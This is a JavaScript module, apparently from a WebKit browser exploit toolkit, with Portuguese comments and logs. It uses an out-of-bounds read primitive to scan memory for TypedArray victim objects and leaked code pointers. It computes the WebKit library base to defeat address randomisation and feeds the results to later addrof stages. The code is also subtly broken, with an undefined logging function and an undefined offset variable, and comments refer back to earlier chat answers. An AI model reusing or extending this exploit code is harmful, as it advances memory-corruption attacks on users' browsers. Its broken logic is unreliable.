// js/victim_finder.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';

const FNAME_BASE = "VictimFinder";

const TYPED_ARRAY_MODES = {
    0x00: "Int8Array", 0x01: "Int16Array", 0x02: "Int32Array", 0x03: "Uint8Array",
    0x04: "Uint8ClampedArray", 0x05: "Uint16Array", 0x06: "Uint32Array",
    0x07: "Float32Array", 0x08: "Float64Array", 0x09: "DataView",
};

let leakedWebKitBaseAddress = null;
let KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];

export function setLeakedWebKitBaseAddress(baseAddrHex) {
    // ... (como antes)
    const FNAME_SET_BASE = `${FNAME_BASE}.setLeakedWebKitBaseAddress`;
    if (!baseAddrHex) {
        leakedWebKitBaseAddress = null;
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
        log(`Endereço base da WebKit LIMPO.`, "info", FNAME_SET_BASE);
        return;
    }
    try {
        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
        log(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_SET_BASE);
        
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets || []).map(offsetHex =>
            leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(offsetHex))
        );
        if (KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0) {
            log(`VTables Absolutas Calculadas: ${KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.map(a => a.toString(true)).join(', ')}`, 'info', FNAME_SET_BASE);
        } else {
            log(`Nenhum offset de VTable conhecido em WEBKIT_LIBRARY_INFO para calcular endereços absolutos.`, 'warn', FNAME_SET_BASE);
        }
    } catch (e) {
        log(`Erro ao definir endereço base da WebKit: ${e.message}`, "error", FNAME_SET_BASE);
        leakedWebKitBaseAddress = null;
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
    }
}

async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
    // ... (lógica interna como na resposta que começava "Você está absolutamente certo em querer refinar os offsets...")
    // A principal mudança é que Core.oob_array_buffer_real.byteLength deve estar atualizado.
    // Esta função é chamada por scanMemory.
    try {
        const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
        const vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
        let vtableMatch = false;

        if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0) {
            for (const knownVTableAddr of KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES) {
                if (vtable_ptr && vtable_ptr.equals(knownVTableAddr)) { // Adicionado check para vtable_ptr não ser null
                    vtableMatch = true;
                    break;
                }
            }
        }

        const modeReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_MODE_OFFSET;
        const m_mode_val = Core.oob_read_relative(modeReadOffset, 1);

        const lengthReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
        const m_length_val = Core.oob_read_relative(lengthReadOffset, 4);

        const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
        const m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);

        const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
        const isLengthPlausible = m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
        const isVectorPlausible = m_vector_ptr && !m_vector_ptr.isNullPtr() && !m_vector_ptr.isNegativeOne() && m_vector_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

        if (typeName && isLengthPlausible && isVectorPlausible) {
            const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
            const m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
            const isBufferPtrPlausible = m_buffer_ptr && !m_buffer_ptr.isNullPtr() && !m_buffer_ptr.isNegativeOne() && m_buffer_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

            if (isBufferPtrPlausible) {
                const candidate = {
                    type: "TypedArray",
                    gapOrRelativeOffset: currentCandidateBaseRelOffset,
                    m_mode: m_mode_val, typeName: typeName, m_length: m_length_val,
                    m_vector_hex: m_vector_ptr.toString(true),
                    m_buffer_hex: m_buffer_ptr.toString(true),
                    vtable_ptr_hex: vtable_ptr ? vtable_ptr.toString(true) : "N/A",
                    vtable_match: vtableMatch
                };
                 if (vtableMatch) {
                     logFn(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(candidate.gapOrRelativeOffset)}, Tipo: ${typeName}, VTable: ${candidate.vtable_ptr_hex}`, 'good', `${FNAME_BASE}.scanForTypedArrays`);
                }
                // else { // Log normal mesmo sem vtable match
                // logFn(`   Candidato TypedArray: GAP/OffsetRel: ${toHexS1(candidate.gapOrRelativeOffset)}, Tipo: ${typeName}, VTable Lida: ${candidate.vtable_ptr_hex}`, 'leak', `${FNAME_BASE}.scanForTypedArrays`);
                // }
                return candidate; // Retorna o candidato se todas as checagens básicas passaram
            }
        }
    } catch (e) { 
        if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
            // Logar outros erros que não sejam o esperado RangeError de fim de buffer.
            logFn(`Erro informativo durante scanForTypedArrays em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.message}`, 'info', `${FNAME_BASE}.scanForTypedArrays`);
        }
    }
    return null;
}

async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
    // ... (lógica como na resposta que começava "Você está absolutamente certo em querer refinar os offsets...")
    // Esta função usaria WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS
    try {
        const potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);

        if (potentialPtr && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
            // Se leakedWebKitBaseAddress é conhecido, podemos validar melhor o ponteiro
            if (leakedWebKitBaseAddress) {
                // Verifica se o potentialPtr está dentro de um segmento conhecido da lib WebKit
                for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                    const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
                    const segEnd = segStart.add(AdvancedInt64.fromHex(segment.memsz_hex));
                    if (potentialPtr.greaterThanOrEqual(segStart) && potentialPtr.lessThan(segEnd)) {
                        // É um ponteiro dentro de um segmento conhecido! Agora tenta achar a função.
                        for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                            const funcAbsoluteAddr = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(funcOffsetHex));
                            if (potentialPtr.equals(funcAbsoluteAddr)) {
                                const candidate = {
                                    type: "CodePointer (Exact Match)",
                                    gapOrRelativeOffset: currentCandidateBaseRelOffset,
                                    leakedPtrHex: potentialPtr.toString(true),
                                    knownFunction: funcName,
                                    libraryBaseHex: leakedWebKitBaseAddress.toString(true)
                                };
                                return candidate;
                            }
                        }
                         // Se não for um match exato, mas dentro do segmento, ainda é interessante
                        const candidate = {
                            type: "CodePointer (In-Segment)",
                            gapOrRelativeOffset: currentCandidateBaseRelOffset,
                            leakedPtrHex: potentialPtr.toString(true),
                            segmentName: segment.name,
                            libraryBaseHex: leakedWebKitBaseAddress.toString(true)
                        };
                        return candidate; // Retorna o primeiro achado dentro de um segmento
                    }
                }
            } else { // Base da lib não conhecida, tenta calcular
                for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                    const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                    const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
                    // isPlausibleLibraryBase
                    if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) {
                        const candidate = {
                            type: "CodePointer (Base Calculated)",
                            gapOrRelativeOffset: currentCandidateBaseRelOffset,
                            leakedPtrHex: potentialPtr.toString(true),
                            calculatedBaseHex: potentialBaseAddr.toString(true),
                            probableFunction: funcName,
                            functionOffset: funcOffsetHex
                        };
                        return candidate;
                    }
                }
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

// Função principal de scan que é chamada pelo handler
export async function scanMemory(scanStartRelativeOffset, scanRangeBytes, stepBytes = 8, scanConfig = {typedArrays: true, codePointers: false}) {
    const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
    appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
    updateOOBConfigFromUI(); // Garante que OOB_CONFIG está atualizado
    
    // Garante que a primitiva OOB esteja ativa com as configurações MAIS RECENTES da UI
    // Isso é crucial para que Core.oob_array_buffer_real.byteLength esteja correto.
    if (!Core.oob_array_buffer_real || 
        OOB_CONFIG.ALLOCATION_SIZE !== Core.oob_dataview_real?.byteLength || // Verifica se config mudou
        OOB_CONFIG.BASE_OFFSET_IN_DV !== Core.oob_dataview_real?.byteOffset) {
        appLog("   Configurações OOB ou buffer OOB parecem desatualizados/não ativos. Reativando primitiva OOB...", 'warn', FNAME_SCAN);
        await Core.triggerOOB_primitive(); // Chama para garantir que o buffer OOB é recriado com as configs da UI
        if (!Core.oob_array_buffer_real) {
            appLog("   ERRO: Primitiva OOB não pôde ser ativada/reativada. Varredura abortada.", 'error', FNAME_SCAN);
            return [];
        }
    }
    
    appLog(`   Usando Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, 'info', FNAME_SCAN);
    appLog(`   Buffer OOB Real Total: ${Core.oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_SCAN);
    appLog(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelativeOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);
    appLog(`   Tipos de Scan Ativos: TypedArrays=${scanConfig.typedArrays}, CodePointers=${scanConfig.codePointers}`, 'info', FNAME_SCAN);

    const candidates = [];
    const maxRelativeOffsetToScanUpTo = scanStartRelativeOffset + scanRangeBytes;

    const lastFieldStructureOffset = Math.max(
        JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET,
        JSC_OFFSETS.TypedArray.M_MODE_OFFSET, JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET
    ) + 8; // +8 para o tamanho do maior campo (ponteiro)
    // O safeBaseCandidateLimitRelative é o offset base MÁXIMO do candidato
    // tal que AINDA podemos ler todos os seus campos sem sair do Core.oob_array_buffer_real.
    const safeBaseCandidateLimitRelative = (Core.oob_array_buffer_real.byteLength - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE - lastFieldStructureOffset;

    appLog(`   Scan irá até offset relativo (base do candidato): ${toHexS1(maxRelativeOffsetToScanUpTo)}`, 'info', FNAME_SCAN);
    appLog(`   Limite seguro para base do candidato (relativo): ${toHexS1(safeBaseCandidateLimitRelative)}`, 'info', FNAME_SCAN);

    for (let currentCandidateBaseRelOffset = scanStartRelativeOffset; currentCandidateBaseRelOffset < maxRelativeOffsetToScanUpTo; currentCandidateBaseRelOffset += stepBytes) {
        if (currentCandidateBaseRelOffset > safeBaseCandidateLimitRelative) {
            appLog(`   AVISO: Base candidata ${toHexS1(currentCandidateBaseRelOffset)} excedeu limite seguro de leitura ${toHexS1(safeBaseCandidateLimitRelative)}. Parando varredura.`, 'warn', FNAME_SCAN);
            break;
        }
        if (document.hidden) { log("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break; }
        await PAUSE_LAB(1);

        let foundThisIteration = null;
        if (scanConfig.typedArrays) {
            const taCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, appLog);
            if (taCandidate) {
                candidates.push(taCandidate);
                foundThisIteration = taCandidate;
                // Log específico já está em scanForTypedArrays
            }
        }
        if (scanConfig.codePointers && !foundThisIteration) { // Evita logar duas vezes para o mesmo offset base
            const cpCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, appLog);
            if (cpCandidate) {
                candidates.push(cpCandidate);
                // Log específico para code pointer
                appLog(`   CANDIDATO PONTEIRO DE CÓDIGO: OffsetRel ${toHexS1(cpCandidate.gapOrRelativeOffset)}, Ptr: ${cpCandidate.leakedPtrHex}, BaseCalc: ${cpCandidate.calculatedBaseHex} (para ${cpCandidate.probableFunction || cpCandidate.segmentName || 'N/A'})`, 'leak', FNAME_SCAN);
            }
        }
    }

    if (candidates.length > 0) {
        appLog(`   Varredura concluída. ${candidates.length} candidatos totais encontrados.`, 'good', FNAME_SCAN);
    } else {
        appLog(`   Varredura concluída. Nenhum candidato encontrado com os critérios atuais.`, 'warn', FNAME_SCAN);
    }
    log(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
    return candidates;
}

export async function findVictimButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE}.Handler`;
    const scanRangeEl = document.getElementById('victimFinderScanRange');
    const scanStepEl = document.getElementById('victimFinderScanStep');
    const scanStartOffsetEl = document.getElementById('victimFinderScanStartOffset');
    // Adicionar checkboxes para scanConfig no HTML e ler aqui
    // const scanTypedArraysEl = document.getElementById('scanTypeTypedArray');
    // const scanCodePointersEl = document.getElementById('scanTypeCodePointers');

    const scanRange = scanRangeEl ? parseInt(scanRangeEl.value, 10) : 30000; // Default grande
    const scanStep = scanStepEl ? parseInt(scanStepEl.value, 10) : 8;
    let scanStartOffset;

    try { // Lógica de parse de offset como antes
        const offsetStr = scanStartOffsetEl ? scanStartOffsetEl.value.trim() : "";
        if (offsetStr === "") { 
            scanStartOffset = Core.getInitialBufferSize(); // Chamada de função agora
            if (scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else if (offsetStr.toLowerCase().startsWith("0x")) {
            scanStartOffset = parseInt(offsetStr, 16);
        } else {
            scanStartOffset = parseInt(offsetStr, 10);
        }
        if (isNaN(scanStartOffset) || scanStartOffset < 0) {
             scanStartOffset = Core.getInitialBufferSize(); 
             if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else {
            if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        }
    } catch (e) {
        scanStartOffset = Core.getInitialBufferSize(); 
        if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
    }

    // Configurações de tipo de scan (exemplo, precisa de UI)
    const scanConfig = {
        typedArrays: true, // document.getElementById('scanTypeTypedArray')?.checked || false,
        codePointers: true // document.getElementById('scanTypeCodePointers')?.checked || false,
    };
    if (!scanConfig.typedArrays && !scanConfig.codePointers) {
        appLog("Nenhum tipo de scan selecionado para o VictimFinder.", "warn", FNAME_HANDLER);
        // Poderia habilitar TypedArray por padrão se nada for selecionado
        // scanConfig.typedArrays = true;
    }

    const candidates = await scanMemory(scanStartRelativeOffset, scanRange, scanStep, scanConfig);

    if (candidates.length > 0) {
        appLog("Candidatos Encontrados pelo Scanner:", "analysis", FNAME_HANDLER);
        let firstTypedArrayCandidate = null;
        candidates.forEach(c => {
            if (c.type === "TypedArray") {
                if (!firstTypedArrayCandidate) firstTypedArrayCandidate = c;
                appLog(`  - TypedArray: GAP/Offset: ${toHexS1(c.gapOrRelativeOffset)} | Tipo: ${c.typeName} (${toHexS1(c.m_mode,2)}) | Len: ${c.m_length} | Vec: ${c.m_vector_hex} | VTable: ${c.vtable_ptr_hex} ${c.vtable_match ? '(MATCH!)' : ''}`, "analysis", FNAME_HANDLER);
            } else if (c.type && c.type.includes("CodePointer")) {
                appLog(`  - CodePointer: OffsetScan ${toHexS1(c.gapOrRelativeOffset)} | Ptr: ${c.leakedPtrHex} | BaseCalc: ${c.calculatedBaseHex} (Função: ${c.probableFunction || c.knownFunction || c.segmentName || 'N/A'})`, "leak", FNAME_HANDLER);
                 // Auto-setar a base da lib se um CodePointer com base calculada for encontrado
                if (c.calculatedBaseHex && !leakedWebKitBaseAddress) { // Define apenas se ainda não estiver definido
                    const leakedWebKitBaseHexEl = document.getElementById('leakedWebKitBaseHex');
                    if (leakedWebKitBaseHexEl) leakedWebKitBaseHexEl.value = c.calculatedBaseHex;
                    setLeakedWebKitBaseAddress(c.calculatedBaseHex);
                }
            } else {
                appLog(`  - Candidato Desconhecido: ${JSON.stringify(c)}`, "warn", FNAME_HANDLER);
            }
        });

        const gapInputEl = document.getElementById('gap_to_test_input');
        const addrofGapEl = document.getElementById('addrofGap');
        if (firstTypedArrayCandidate) { // Usa o primeiro TypedArray encontrado para popular os GAPs
            const firstCandidateGap = firstTypedArrayCandidate.gapOrRelativeOffset;
            if (gapInputEl) {
                gapInputEl.value = firstCandidateGap;
                appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'gap_to_test_input' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
            if (addrofGapEl) {
                addrofGapEl.value = firstCandidateGap;
                 appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'addrofGap' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
        }
    } else {
        appLog("Nenhum candidato encontrado na varredura com os critérios atuais.", "warn", FNAME_HANDLER);
    }
}
